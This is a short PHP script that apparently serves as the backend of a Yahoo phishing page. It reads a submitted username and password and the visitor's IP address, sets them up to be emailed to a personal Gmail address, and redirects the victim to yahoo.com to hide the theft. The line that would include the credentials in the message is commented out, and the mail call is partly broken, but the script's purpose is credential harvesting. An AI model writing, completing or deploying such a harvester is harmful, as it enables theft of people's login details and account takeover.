<?php

$word = $_POST['pass'];
$log  = $_POST['username'];
$ip = $_SERVER['REMOTE_ADDR'];


$to ='cinatlryan77@gmail.com';
$subject = 'yahoo';
//$message = $word." ".$log." ".$ip;
$message = "sent";

$headers ='From: '.$log.''.'\n\n';
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";

mail("cinatlryan77@gmail","yahoo","sent","my header");

header("location:http://yahoo.com");


?>